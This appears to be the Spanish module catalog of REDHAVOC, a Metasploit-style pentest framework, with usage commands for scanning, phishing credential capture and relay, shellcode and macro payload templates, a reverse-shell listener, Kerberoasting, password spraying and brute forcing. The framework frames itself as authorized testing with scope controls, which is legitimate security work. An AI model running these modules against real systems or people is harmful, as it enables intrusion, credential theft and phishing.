# Catálogo de módulos — REDHAVOC

79 módulos nativos en 12 categorías. Todos aceptan las opciones globales
(TIMEOUT, THREADS, USER_AGENT, PROXY) y generan informe JSON+MD+HTML+PDF.

## 🆕 Novedades v2.2 — protocolos nuevos: Redis, SNMP, GraphQL, CRLF, contenedores y RootDSE

### Módulos nuevos (73 → 79)
| Módulo | Qué hace | Riesgo |
|---|---|---|
| `recon/redis_enum` | Redis por RESP propio (socket TCP, PING/INFO/DBSIZE de lectura): SIN_AUTH / PROTEGIDA / NO_REDIS; sin auth = hallazgo alto | medio |
| `recon/snmp_enum` | SNMP v2c con ASN.1 BER hecho a mano: comunidades típicas → sysDescr/sysName/sysUpTime/sysLocation; decoder GET-RESPONSE propio | medio |
| `web/graphql_probe` | Descubre endpoints GraphQL (14 rutas), sonda de introspección mínima y playgrounds (GraphiQL/Altair/Apollo); introspección abierta = hallazgo medio | bajo |
| `web/crlf_scan` | CRLF / Response Splitting con 3 variantes (%0d%0a, doble-codificado, reflejado) y cabecera canaria; separa inyección confirmada de reflejo | medio |
| `cloud/k8s_enum` | Planos de control sin credenciales: Kubernetes (6443), kubelet (10250) y Docker API (2375); puertos configurables; pods visibles | medio |
| `ad/rootdse_enum` | RootDSE anónima por LDAP propio: naming contexts, DN base del dominio y niveles funcionales (→ "Windows Server 2016/2019/2022/2025") | bajo |

Consejos accionables para los seis (`core/advice.py`): Redis sin auth →
requirepass/TLS; comunidad SNMP → mapeo de red; introspección → exportar
esquema y BOLA; CRLF → envenenado de caché; plano anónimo → RBAC/2375;
RootDSE → `ad/ldap_enum` con el DN descubierto. Suite: **484 tests**
(con laboratorios reales en localhost: mini-Redis RESP y mini-agente SNMP).

## 🆕 Novedades v2.1 — roadmap completado: PDF, plugins, relay y cloud

### Roadmap completado (3/3)
- **PDF puro (`core/pdf_min`)**: cada ejecución genera JSON + MD + HTML + **PDF**
  (páginas A4, paginación automática, tablas Courier, pie numerado); además
  `export pdf` vuelca el workspace completo a un PDF ejecutivo. Sin
  dependencias: el generador es Python puro y se valida con la suite.
- **`phishing/relay_proxy`**: relay inverso de SIMULACIÓN (evilginx2 de
  laboratorio). Espeja el portal objetivo, reescribe enlaces, detecta
  formularios de login y guarda usuario/contraseña + cookies en
  `output/phishing/relay_capturas.json`. INTERACTIVO (Ctrl+C), riesgo ALTO.
- **Comando `plugin`**: `plugin install <ruta|URL.git>` (AUTHORIZED +
  confirmación REVISADO para remotos), `plugin list`, `plugin del <categoria>`.
  Los módulos del pack quedan disponibles AL INSTANTE (registro en caliente)
  y cada instalación queda en la traza `audit`.

### Módulos nuevos (64 → 73)
| Módulo | Qué hace | Riesgo |
|---|---|---|
| `cloud/s3_enum` | Cubos S3 con listado anónimo (ListObjectsV2): LISTABLE / PROTEGIDO / NO_EXISTE / OTRA_REGION + claves expuestas | bajo |
| `cloud/azure_blob` | Contenedores de Azure Blob listables (`restype=container&comp=list`) | bajo |
| `cloud/gcs_enum` | Cubos GCS: metadata + listado anónimo (API JSON v1) | bajo |
| `web/http_methods` | Allow de OPTIONS, eco TRACE (XST) con marcador inerte, métodos peligrosos declarados | bajo |
| `web/host_header_injection` | Reflexión de Host / X-Forwarded-Host con sonda inexistente (reset/cache poisoning) | bajo |
| `web/open_redirect` | Sonda relativo-protocolo en parámetros url/next/redirect... sin seguir la redirección | bajo |
| `web/subdomain_takeover` | CNAME (DNS propio UDP/53) + 15 firmas de servicios colgados (GitHub Pages, S3, Azure...) | medio |
| `osint/dork_builder` | Cuaderno de Google/GitHub dorks del dominio, 100 % offline → `output/dorks_<dominio>.md` | bajo |
| `phishing/relay_proxy` | Relay inverso de simulación del lab (captura creds/cookies) | alto |

## 🆕 Novedades v2.0 — AES puro, GPP cpassword y workspaces múltiples

### Motores nuevos
- **`core/aes_min`** — AES puro (FIPS-197): ECB/CBC, claves 128/192/256,
  PKCS#7. Verificado contra los vectores oficiales FIPS-197 y NIST
  SP 800-38A, además de roundtrips UTF-8. Cero dependencias externas.

### Módulos nuevos (58 → 64)
| Módulo | Qué hace | Riesgo |
|---|---|---|
| `ad/gpp_cpassword` | Descifra `cpassword` de GPP (MS14-025) de Groups.xml y los 5 XML más de SYSVOL con AES-256 propio; registra hallazgo alto + creds | medio |
| `recon/smtp_enum` | Enumera buzones con VRFY/EXPN/RCPT sobre socket propio; detecta MTA del banner | medio |
| `web/clickjack` | X-Frame-Options (incluido ALLOW-FROM obsoleto), CSP frame-ancestors, iframes embebidos | bajo |
| `web/xss_reflected` | Detecta reflexión con marcador INERTE y clasifica contexto (HTML/atributo/script/comentario/sin filtrar) — sin payloads activos | medio |
| `web/path_traversal` | 7 variantes de LFI (../, %2e, doble encode, ..%2f, ....//, absoluto) con firma inequívoca (/etc/passwd o win.ini) | medio |
| `brute/telnet_login` | Telnet con socket puro: prompts gestionados y verificación por eco | alto |

### Workspaces múltiples y persistencia
- `workspace` (lista con el activo marcado) · `workspace new/use/del <nombre>`.
- Cada workspace = `workspace/ws_<nombre>.json` (el `principal` mantiene
  `db.json`, retrocompatible); el activo se restaura al arrancar.
- **Persistencia de opciones**: `set`/`setg`/`unset`/`unsetg` quedan en
  `workspace/opciones.json` y se restauran al arrancar/cargar módulos.
  AUTHORIZED nunca se persiste.

---

## 🧭 Novedades v1.6 — consejos accionables

Cada módulo, al terminar, muestra un panel **"siguientes pasos"** con hasta
4 recomendaciones accionables y el comando exacto (`→ use ad/smb_check`).
El motor vive en `core/advice.py` y cubre las 11 categorías; ejemplos:

| Resultado | Consejo generado |
|---|---|
| puerto 445 abierto | enumera firma y shares → `use ad/smb_check` |
| puerto 88/389 abierto | `use ad/kerberos_userenum` / `use ad/ldap_enum` |
| SPNs enumerados | pide TGS → `use ad/kerberoast` |
| hashes 13100/18200 | crackea offline (`CRACK true`) y valida con `use ad/smb_login` |
| usuarios válidos | `use ad/asreproast` + spray con canario |
| credenciales válidas | reuso → `creds`, `use ad/smb_share_enum` |
| CMS detectado | `use web/cms_detect` y luego `use web/sqli_scanner` |
| secreto JWT roto | demuestra el impacto SOLO en laboratorio |
| fuga OPSEC | corrige PROXY/TOR antes de seguir |
| sin hallazgos | cómo ampliar: OSINT pasivo, dirs, ping_sweep |

El comando **`consejos`** lee el workspace y resume el plan de batalla:
prioriza hallazgos críticos, sugiere reuso de credenciales y la cadena AD/web
según los hosts descubiertos.

---

## 🔎 recon (6)

### `recon/ip_info`
Geolocalización y datos de red de una IP o dominio vía ip-api.com (sin API key).
```text
use recon/ip_info
set TARGET 8.8.8.8
run
```
Devuelve: país, ciudad, lat/lon, ISP, ASN, PTR, flags proxy/hosting/mobile.

### `recon/whois_lookup`
WHOIS crudo por socket (43): consulta a IANA, sigue `refer:` al registrador
y extrae campos clave.
```text
use recon/whois_lookup
set DOMAIN example.com
run
```

### `recon/dns_enum`
Cliente DNS a mano sobre UDP/53 (sin dnspython): construye y parsea paquetes,
resuelve compresión de nombres.
```text
use recon/dns_enum
set DOMAIN example.com
set TIPOS A,AAAA,MX,NS,TXT,SOA
set RESOLVER 1.1.1.1        # opcional
run
```

### `recon/port_scanner`
TCP connect multihilo con banner grabbing y etiquetado de servicios.
```text
use recon/port_scanner
set TARGET 10.0.0.5
set PORTS 22,80,443,3306,8000-8100   # lista o rango (máx. 10.000)
set BANNER true
run
```

### `recon/subdomain_scan`
Resolución DNS masiva de wordlist (120 subdominios integrados o personalizada).
```text
use recon/subdomain_scan
set DOMAIN example.com
set WORDLIST /ruta/mi_lista.txt    # opcional
run
```

### `recon/http_headers`
Audita cabeceras HTTP y puntúa las de seguridad presentes/ausentes (0-100).
```text
use recon/http_headers
set URL https://example.com
run
```

---

## 🌐 web (4)

### `web/tech_detect`
Fingerprinting pasivo: cabeceras (Server, X-Powered-By), cookies
(PHPSESSID, JSESSIONID...) y huellas HTML (wp-content, react, __NEXT_DATA__).
```text
use web/tech_detect
set URL https://example.com
run
```

### `web/dir_bruteforce`
Fuerza bruta de rutas con wordlist integrada (160) y detección de
404-falso (compara con una ruta inexistente).
```text
use web/dir_bruteforce
set URL https://example.com
set EXTENSIONES php,html,backup
run
```

### `web/cms_detect`
Detección por rutas/huellas: WordPress, Joomla, Drupal, Shopify, Moodle,
PrestaShop, con nivel de confianza.
```text
use web/cms_detect
set URL https://example.com
run
```

### `web/sqli_scanner` ⚠️ riesgo alto
Detector EDUCATIVO de SQLi por error: inyecta cargas inocuas en parámetros
GET y busca firmas de error (MySQL, PostgreSQL, SQLite, MSSQL, Oracle).
**No explota ni extrae datos.** Exige `AUTHORIZED`.
```text
use web/sqli_scanner
set URL https://lab.local/item.php?id=1
run
```

---

## 🎣 phishing (3)

### `phishing/template_gen`
Genera páginas de simulación desde las plantillas del repo sustituyendo
`{{ORG}}`, `{{TARGET_URL}}`, `{{FECHA}}`.
```text
use phishing/template_gen
set PLANTILLA portal_corporativo     # o cambio_contrasena
set ORG "ACME Corp"
set TARGET_URL https://intranet.acme.local
set NOMBRE_SALIDA campana-q3
run
# → output/phishing/campana-q3.html
```

### `phishing/campaign_server` ⚠️ riesgo alto
Servidor HTTP de simulación estilo GoPhish: sirve la página, registra
visitas (`/track.gif`) y envíos (`POST /captura`) en
`workspace/capturas/<campana>.json`; redirige a la URL legítima.
```text
use phishing/campaign_server
set PORT 8080
set PAGINA campana-q3
set CAMPANA simulacion-q3
set REDIRECT_URL https://intranet.acme.local
run          # Ctrl+C para detener; capturas persisten
```

### `phishing/mailer` ⚠️ riesgo alto
Envío SMTP para simulaciones con `DRY_RUN=true` por defecto (previsualiza
sin enviar), plantilla de correo con marcadores y límite de 200
destinatarios.
```text
use phishing/mailer
set SMTP_HOST smtp.lab.local
set FROM seguridad@acme.local
SET TO jose@acme.local,maria@acme.local
set ASUNTO "Verificación de seguridad pendiente"
set ENLACE http://192.168.1.50:8080/
set DRY_RUN true        # previsualiza; false envía de verdad
run
```

### `phishing/tunnel` (v1.2)
Túnel SSH inverso estilo zphisher: publica tu `campaign_server` local en
internet sin abrir puertos del router, vía **serveo** o **localhost.run**
(no requieren registro).
```text
# terminal 1: lanza la campaña
use phishing/campaign_server
run

# terminal 2 (o back y usa el túnel):
use phishing/tunnel
set PORT 8080
set PROVEEDOR serveo        # o localhost.run
run
# → https://xxxx.serveo.net  ← comparte ESTA url en la simulación
```
Detén con `Ctrl+C`. La URL la asigna el proveedor en el arranque.

---

## 💣 payloads (3) — plantillas educativas

Todos generan **proyectos de código con cargas inocuas** + README con
compilación, ejercicio de laboratorio y controles de detección. No
compilan ni ejecutan malware.

### `payloads/dll_sideload` ⚠️
Proyecto DLL proxy (MITRE ATT&CK T1574.002): `main.cpp` con DllMain y
exportaciones proxy, `exports.def`, `CMakeLists.txt` y guía de detección.
```text
use payloads/dll_sideload
set NOMBRE lab_proxy
run      # → output/payloads/dll_sideload_lab_proxy/
```

### `payloads/loader_gen` ⚠️
Plantillas de shellcode runner (MITRE T1055/T1027): runners C para Windows
(VirtualAlloc/VirtualProtect) y Linux (mmap/mprotect), `payload_stub.h`
inocuo (exit) y build.sh.
```text
use payloads/loader_gen
set NOMBRE lab
run      # → output/payloads/loader_lab/
```

### `payloads/macro_gen` ⚠️
Plantilla VBA (MITRE T1204.002/T1566.001): gatillos AutoOpen, log local y
`calc.exe` de demostración; guía de AMSI/GPO/EDR.
```text
use payloads/macro_gen
set NOMBRE lab
run      # → output/payloads/macro_lab/
```

---

## 🧩 post (1)

### `post/multi_handler` ⚠️
Listener multi-sesión estilo `multi/handler`. Las conexiones del agente de
laboratorio (`templates/payloads/agent_shell.py`) se registran como
sesiones que **sobreviven** al Ctrl+C del listener.
```text
use post/multi_handler
set LHOST 0.0.0.0
set LPORT 4444
set DURACION 0        # 0 = hasta Ctrl+C; N = segundos de prueba
run

# en otra terminal del lab:
#   python3 templates/payloads/agent_shell.py <ip> 4444

sessions              # lista sesiones
sessions -i 1         # interactúa (background para volver)
sessions -k 1         # cierra una
sessions -k all       # cierra todas
```

---

## 🥷 opsec (1)

### `opsec/tor_check`
Comprueba tu IP de salida y si es nodo TOR; `EXIGIR_TOR=true` falla si no.
```text
use opsec/tor_check
set EXIGIR_TOR true
run
```

---

## 🕵️ osint (6) — ideas de jasonxtn/argus

### `osint/email_harvest`
Extrae correos del sitio objetivo: enlaces mailto, texto con regex y
desobfuscación (`soporte[arroba]dominio`, `usuario at dominio`), además de
páginas de contacto habituales.
```text
use osint/email_harvest
set URL https://example.com
set MAX_PAGINAS 5
run
```

### `osint/social_presence`
Busca un alias en ~20 plataformas públicas (GitHub, Reddit, X, Instagram,
TikTok...) y clasifica: ENCONTRADO / posible / no encontrado.
```text
use osint/social_presence
set ALIAS juan.perez
run
```

### `osint/spf_dmarc`
Valida la postura anti-spoofing del correo: SPF (¿all permisivo?), DMARC
(p=none/quarantine/reject) y selectores DKIM habituales, con el cliente
DNS TXT propio.
```text
use osint/spf_dmarc
set DOMAIN acme.com
run
```

### `osint/zone_transfer`
Intento de AXFR (TCP/53) contra cada NS del dominio. Un NS mal configurado
expone el mapa DNS interno completo.
```text
use osint/zone_transfer
set DOMAIN acme.com
run
```

### `osint/typosquat`
Genera variantes typosquatting (omisión, duplicación, swap, bitsquatting,
vocales, TLDs) y comprueba vía DNS cuáles están registradas.
```text
use osint/typosquat
set DOMAIN acme.com
run
```

### `osint/reverse_ip`
Dominios alojados en la misma IP (Hackertarget, best-effort): útil para
evaluar riesgo de hosting compartido.
```text
use osint/reverse_ip
set TARGET 93.184.216.34
run
```

---

## 📡 iot (3) — ideas de la sección IoT de Scanners-Box

### `iot/device_scan`
Sondea puertos IoT/OT típicos (Telnet 23, RTSP 554, MQTT 1883, Modbus 502,
S7 102, DNP3 20000, BACnet 47808...) y clasifica el dispositivo por banner
(cámara IP, router, PLC, impresora...).
```text
use iot/device_scan
set TARGET 192.168.1.50
run
```

### `iot/upnp_discover`
Descubrimiento SSDP (M-SEARCH a 239.255.255.250:1900) en la LAN: routers,
NAS, cámaras y smart TV que responden con Server/Location.
```text
use iot/upnp_discover
set ESPERA 3
run
```

### `iot/default_creds` ⚠️ riesgo alto
Verificación educativa de credenciales de fábrica (8 pares universales)
por Telnet y HTTP Basic en dispositivos de TU LABORATORIO
(inspirado en rapid7/IoTSeeker y scu-igroup/telnet-scanner).
```text
use iot/default_creds
set TARGET 192.168.1.50
set PUERTOS 23,80
run
```

---

## 🌐 web — añadidos de Argus

### `web/exposed_files`
Comprueba ficheros sensibles con firmas anti-falso-positivo:
`/.git/HEAD`, `/.env`, `/.svn`, backups (zip/sql/tar.gz), phpinfo,
server-status, composer/package.json, security.txt, robots.txt (extrae
rutas Disallow) y sitemap.
```text
use web/exposed_files
set URL https://example.com
run
```

### `web/cors_scan`
CORS inseguro: reflejo de Origin arbitrario con credenciales, Origin null,
subdominio-confiado (prefix match) y preflight OPTIONS.
```text
use web/cors_scan
set URL https://api.example.com/datos
run
```

### `web/waf_detect` (v1.2)
Fingerprinting de WAF con dos señales: cabeceras/cookies características
(cf-ray, __cf_bm, x-amzn-requestid, incap_ses...) y una sonda de bloqueo
de UNA petición (`?id=1 OR '1'='1`). Identifica Cloudflare, AWS WAF,
ModSecurity, Imperva/Incapsula, Sucuri, Akamai y F5 BIG-IP.
```text
use web/waf_detect
set URL https://example.com/app
run
# → WAF: Cloudflare · sonda: 403 (bloqueada)
# útil antes de sqli_scanner/dir_bruteforce: saber que pueden ser bloqueados
```

---

## 🆕 Novedades v1.5 — consola pulida y TLS

### Resultados en la terminal
Al terminar cada `run`, el dict de resultados del módulo se pinta con
paneles/tablas/columnas (`core/render.py`): panel de resumen, línea de
totales, tablas con severidad coloreada y truncado con "… +N más". El
detalle completo sigue disponible en los informes JSON/MD/HTML.

### Spinner con cronómetro y arranque animado
Durante la ejecución: estado animado `modulo en ejecución · 3.4s` con
spinner braille propio; al arrancar, barra de progreso que recorre las
categorías del arsenal. `show modules` ahora se muestra como árbol y
`use <módulo>` presenta un panel con nombre, riesgo y ATT&CK.

### TLS en `post/multi_handler`
Nuevas opciones `TLS`, `CERTFILE`, `KEYFILE` (certificado del lab, p. ej.
generado con openssl); el agente `templates/payloads/agent_shell.py`
conecta cifrado con `--tls`. Un cliente plano que intenta el handshake se
descarta sin romper el listener.

---

## 🆕 Novedades v1.2 — workspace, brute y dos

### Workspace DB y comandos `hosts` / `creds`
Base de datos JSON (`workspace/db.json`) estilo Metasploit:

* `recon/port_scanner` y `recon/ping_sweep` registran hosts y servicios
  automáticamente tras cada escaneo.
* Los módulos de **brute** guardan las credenciales válidas descubiertas.
* Consulta con `hosts` y `creds`; vacía SOLO esa tabla con `hosts -c` /
  `creds -c` / `vulns -c` / `notes -c` (desde v1.8, el resto se conserva).
* `setg <OPT> <valor>` fija opciones GLOBALES aunque haya módulo cargado;
  `use <n>` carga el resultado n de la última `search` (que ahora acepta
  filtros `cat:<categoría>` y `riesgo:<nivel>`).

### Cuaderno, export y auditoría (v1.9)

* `notes add <texto>` · `notes` · `notes -c`: notas libres del operador con
  marca temporal, persistidas en el workspace — el cuaderno de campo del
  pentest (p. ej. `notes add 'DMZ con red plana, revisar segmentación'`).
* `export json` · `export csv` · `export md`: vuelca hosts, creds, vulns y
  notas a `output/` — CSV con escape correcto, MD consolidado con tablas por
  sección listo para anexar al informe del cliente.
* `audit [N]`: muestra los últimos N eventos de la traza ética
  (`workspace/audit.log`): cada RUN, cada bloqueo de riesgo alto y cada
  bloqueo por engagement queda documentado.
* El **historial** persiste entre sesiones (`workspace/historial.txt`,
  máx. 500 líneas; `history -c` lo vacía) y `exit` muestra un **resumen de
  la operación** (duración, hosts, creds, hallazgos, notas, informes).

### 🔨 brute — auditoría de credenciales (riesgo alto)

#### `brute/ftp_login`
Auditoría de credenciales débiles/default sobre FTP con `ftplib` (stdlib).
Acepta wordlists incluidas (`usuarios_lab.txt`, `claves_lab.txt`), rutas o
listas separadas por comas. Se detiene al encontrar una credencial válida.
```text
set AUTHORIZED true
use brute/ftp_login
set TARGET 192.168.1.10
set USERS usuarios_lab.txt
set PASS claves_lab.txt
set MAX_INTENTOS 50        # tope ético (máx. 200)
run
```

#### `brute/http_basic`
Auditoría de HTTP Basic Auth: comprueba primero que la URL responde 401
con `WWW-Authenticate: Basic`, después prueba pares en paralelo.
```text
set AUTHORIZED true
use brute/http_basic
set URL http://192.168.1.10/admin/
run
```

#### `brute/ssh_login`
Auditoría SSH con **paramiko** (dependencia opcional:
`pip install paramiko`; si falta, error limpio). Valida el banner SSH
antes de probar credenciales.
```text
set AUTHORIZED true
use brute/ssh_login
set TARGET 192.168.1.20
set MAX_INTENTOS 30
run
```

### 🌊 dos — prueba de estrés controlada (riesgo alto)

#### `dos/stress_http`
Prueba de carga HTTP de TU infraestructura con métricas (códigos HTTP,
latencia media/máx, errores). Topes duros NO desactivables:
**60 s máximo, 50 hilos, 200 rps globales**.
```text
set AUTHORIZED true
use dos/stress_http
set URL http://10.0.0.5/api/salud
set DURACION 10
set HILOS 10
run
```
> Atacar disponibilidad de terceros es ILEGAL. Este módulo existe para
> validar resiliencia propia con autorización expresa.

### 🥷 opsec — nuevos (v1.2)

#### `opsec/proxy_check`
Doble verificación del anonimato: consulta tu IP a **ip-api** e **ipify**
(services independientes) y avisa si no coinciden (fuga de la cadena
TOR/VPN). Clasifica la salida (proxy/hosting/TOR) y opcionalmente falla
si no estás anónimo (`EXIGIR_PROXY=true`).
```text
use opsec/proxy_check
set EXIGIR_PROXY true
run
```

#### `opsec/mac_changer`
Cambia o aleatoriza la MAC de una interfaz local (Linux + root, usa
`ip link`). Guarda la MAC original en el workspace para poder restaurar:
```bash
sudo python3 redhavoc.py
```
```text
use opsec/mac_changer
set IFACE wlan0
run                       # MAC aleatoria con OUI realista
set RESTAURAR true
run                       # vuelve a la MAC original
```

### 🔎 recon — nuevo (v1.2)

#### `recon/ping_sweep`
Descubrimiento de hosts vivos en un CIDR combinando TCP-ping (puertos
80/443/22/445/3389/8080, sin root) e ICMP opcional del sistema. Registra
los vivos en el workspace.
```text
use recon/ping_sweep
set TARGET 192.168.1.0/24
set ICMP true
set MAX_HOSTS 256          # tope ético (máx. 1024)
run
hosts                      # ahora aparecen los vivos
```

---

## 🏛️ ad + osint extendido + engagement — nuevo (v1.3)

### `ad/ldap_enum` — Active Directory vía LDAP
Cliente LDAP propio (`core.ldap_min`, BER a mano, TCP/389). Bind anónimo o
simple, filtros `=`, `*`, `&`, `|`, `!`.
```text
use ad/ldap_enum
set RHOST 10.0.0.10
set BASE_DN DC=corp,DC=local
set FILTRO (objectClass=person)
run
```

### `ad/kerberos_userenum` — usuarios por Kerberos (kerbrute-style)
Un AS-REQ sin preauth por usuario: el KDC responde 25 (existe), 6 (no
existe) o 18 (bloqueado). Sin autenticación.
```text
set RHOST 10.0.0.10
set REINO CORP.LOCAL
set USUARIOS @templates/wordlists/ad_usuarios.txt
run
```

### `ad/asreproast` — AS-REP roasting (T1558.004)
Localiza usuarios con preautenticación deshabilitada y guarda sus hashes
en formato hashcat `-m 18200` (`output/ad/asrep_<reino>.txt`). No crackea.
```text
set RHOST 10.0.0.10
set REINO CORP.LOCAL
set USUARIOS @usuarios.txt
set TCP true
run
# offline: hashcat -m 18200 output/ad/asrep_corp.local.txt diccionario.txt
```

### `ad/spn_enum` — cuentas con SPN (pre-kerberoasting)
Lista vía LDAP las cuentas con `servicePrincipalName` y qué servicios
(MSSQLSvc, HTTP, cifs…) corren bajo cada una.

### `ad/smb_check` — auditoría de firma SMB2
Negotiate SMB2 propio (TCP/445): dialecto máximo, firma exigida, GUID y
NTLM. Si la firma no es exigida, avisa de riesgo de relevo NTLM (T1557).

### `ad/passwd_spray` ⚠️ — spray Kerberos con canario (goteo)
AS-REQ con PA-ENC-TIMESTAMP (RC4-HMAC RFC 4757, MD4 puro). Una o pocas
claves contra muchos usuarios, con **canario anti-lockout**: la cuenta
centinela se prueba primero y si acumula `MAX_FALLOS` fallos se aborta
todo el spray. `PAUSA_MS` entre intentos. Exige `AUTHORIZED`.
```text
set RHOST 10.0.0.10
set REINO CORP.LOCAL
set USUARIOS @usuarios.txt
set CLAVES Empresa2024!
set CANARIO lab_canario
set MAX_FALLOS 2
run
```

### `ad/net_discover` — escucha pasiva LLMNR/NBT-NS/mDNS
Abre sockets UDP 5355/137/5353 y registra nombres preguntados en la LAN
(fase de reconocimiento previa a Responder). Solo escucha: NUNCA responde.
Puertos < 1024 requieren root; los fallos de bind se degradan con aviso.

### osint extendido (ideas de reconmap)
| Módulo | Uso |
|---|---|
| `osint/cert_transparency` | Subdominios desde crt.sh + CertSpotter |
| `osint/wayback_urls` | Endpoints históricos y con parámetros (CDX) |
| `osint/rdap_lookup` | Registrar/abuse (dominio) o ASN/org/país (IP) |
| `osint/doc_metadata` | Autores/software/correos de PDF/OOXML (FOCA-style) |
| `osint/paste_search` | Pastes con el dominio en psbdmp.ws |
| `osint/email_verify` | RCPT TO sin envío: buzón existe/no existe/unknown |

### `post/host_audit` ⚠️ — generador de auditoría de host (EvasiveAudit-style)
Genera un script PowerShell de laboratorio que colecta sistema, red,
defensas, usuarios, procesos, servicios, tareas, recientes, apps,
navegadores y ficheros de credenciales (WiFi opcional) y lo codifica en
JSON base64. **Sin técnicas de evasión por diseño** (sin AMSI bypass).
```text
use post/host_audit
set NOMBRE audit_lab
run
# → output/host_audit/audit_lab/audit_lab.ps1 + README.md
```

### Comandos nuevos de la consola
```text
engagement                      # estado del engagement cargado
engagement load <fichero.json>  # carga scope + kill-date (plantilla: templates/engagement_ejemplo.json)
engagement clear                # descarta el engagement
attack                          # mapa módulos ↔ técnicas MITRE ATT&CK
attack T1110                    # filtra por técnica (prefijo)
```
Con un engagement cargado, `run` BLOQUEA los módulos cuyo
TARGET/URL/DOMAIN/HOST/RHOST/CIDR quede fuera del alcance o con kill-date
vencido (auditado en `workspace/audit.log`).

---

## 🔥 Kerberoasting, SMB/NTLMv2, hallazgos y resource — nuevo (v1.4)

### `ad/kerberoast` — kerberoasting completo (T1558.003)
Obtiene un TGT con credenciales válidas (PA-ENC-TIMESTAMP), extrae la clave
de sesión del AS-REP y lanza un TGS-REQ con AP-REQ propio por cada SPN. El
enc-part del TGS-REP es el hash de la cuenta de servicio → hashcat `-m 13100`.
```text
use ad/kerberoast
set RHOST 10.0.0.10
set REINO CORP.LOCAL
set USUARIO usuario
set PASSWORD 'ClaveValida'
run                        # usa los SPN del último informe de ad/spn_enum
set CRACK true
set WORDLIST @diccionario.txt
run                        # rompe los hashes en local (RC4-HMAC puro, sin hashcat)
```
Salida: `output/ad/kerberoast_<reino>.txt` + `crackeados` en el informe.

### `ad/asreproast` — ahora también crackea
Además de los hashes 18200 de siempre, acepta `CRACK=true` + `WORDLIST`
(crackeo offline con RC4-HMAC puro, verificación por checksum).

### `ad/smb_login` ⚠️ — credenciales contra SMB2 (NTLMv2 propio)
Cliente NTLMSSP type1/type2/type3 en `core/smb_min`: calcula la respuesta
NTLMv2 (HMAC-MD5 + blob con TargetInfo del servidor) sin librerías. Distingue
clave incorrecta, cuenta deshabilitada y **lockout** (aborta de inmediato).
```text
use ad/smb_login
set RHOST 10.0.0.10
set CREDENCIALES "CORP\\admin:Clave1, bob:MalPlanta2"
run
```
Las válidas quedan en el workspace (`creds`) y el host en `hosts`.

### `ad/smb_share_enum` — descubrimiento de shares (T1135)
TREE_CONNECT/TREE_DISCONNECT propios: clasifica cada share como LEGIBLE,
DENEGADO o NO EXISTE (estilo `netexec --shares`). Si ADMIN$/C$ es legible
registra un hallazgo alto en el workspace y avisa de ejecución remota; si
SYSVOL es legible, sugiere revisar GPP.
```text
use ad/smb_share_enum
set RHOST 10.0.0.10
set USUARIO admin
set PASSWORD 'Clave'
run
```

### `web/jwt_analyzer` — auditoría de JWT
Decodifica (b64url propio) y audita: `alg=none` o token sin firma (crítico),
secretos débiles HS256 (verifica con HMAC-SHA256 contra lista integrada),
`exp`/`nbf` caducados o ausentes y `kid` con caracteres de inyección.
```text
use web/jwt_analyzer
set TOKEN eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
run
# o: set URL https://api.test/login  (lee token/access_token/jwt del JSON)
```

### `web/cookie_audit` — atributos de cookies
Clasifica por cookie: Secure, HttpOnly, SameSite, prefijo `__Host-` bien
usado y Max-Age > 90 días. Las de riesgo alto se registran en `vulns`.

### `web/ssti_scanner` — inyección de plantillas (T1221)
Sondas inocuas con marca única: envía `rvh{{7*7}}`; si la respuesta contiene
`rvh49` hay render de plantillas (Jinja2/Twig/FreeMarker/ERB/Smarty). Sin
payloads destructivos; el informe recuerda remitir a desarrollo.
```text
use web/ssti_scanner
set URL "https://t.test/saludo?nombre=x"
run
```

### Tabla `vulns` del workspace y comandos nuevos
Los hallazgos graves quedan en el workspace (deduplicados, ordenados por
severidad) y se consultan con el comando `vulns`:
```text
vulns          # tabla de hallazgos (severidad, host, módulo)
vulns -c       # limpia el workspace
resource lab.rc  # ejecuta un guion de comandos al estilo msf
```
Ejemplo de guion `lab.rc`:
```text
# reconocimiento básico del lab
use recon/ping_sweep
set CIDR 10.0.0.0/24
run
vulns
```

### `core/smb_min` y `core/krb5` (nuevos motores)
- `smb_min`: NEGOTIATE + SESSION_SETUP (NTLMv2 puro) + TREE_CONNECT;
  `ad/smb_check` reutiliza ahora el mismo cliente.
- `krb5`: TGS-REQ/AP-REQ, `descifrar_rc4_hmac` con verificación de checksum
  y crackeo offline de hashes 18200/13100.

### Plantillas nuevas
`templates/phishing/teams_login.html` y `templates/phishing/docusign_firma.html`
(mismos marcadores {{ORG}}/{{FECHA}} + POST /captura + /track.gif) y la
plantilla de informe ejecutivo `templates/reportes/informe_ejecutivo.md`.

---

## Opciones globales (afectan a todos los módulos)

| Opción | Defecto | Descripción |
|---|---|---|
| AUTHORIZED | (vacío) | Habilita módulos de riesgo alto |
| REPORT | true | Genera informe JSON+MD+HTML tras cada run |
| THREADS | 10 | Hilos para módulos concurrentes |
| TIMEOUT | 5 | Timeout de red en segundos |
| USER_AGENT | REDHAVOC/2.0.0 | UA HTTP por defecto |
| PROXY | (vacío) | Proxy HTTP(S) para módulos basados en requests |
| VERBOSE | false | Tracebacks completos en errores |
